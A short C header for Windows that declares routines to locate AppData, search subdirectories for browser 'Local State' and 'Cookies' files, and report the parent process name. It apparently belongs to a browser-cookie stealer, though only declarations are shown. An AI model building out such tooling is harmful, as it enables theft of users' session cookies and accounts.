#ifndef FIND_LOCAL_STATE_H
#define FIND_LOCAL_STATE_H

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>  // For SHGetFolderPath


#define MAX_PATH_LENGTH 4096
#define MAX_FILES 1000 // Adjust as needed for maximum expected Local States

void print_parent_process_name();

// Struct to hold file paths
typedef struct {
    char localState[MAX_PATH_LENGTH];
    char cookies[MAX_PATH_LENGTH];
} FilePaths;

// Function declarations
void FindFile();
void find_appdata_path(char *appdata_path);
void search_in_subdirectories(const char *dir_path, FilePaths *results, int *count);

#endif // FIND_LOCAL_STATE_H
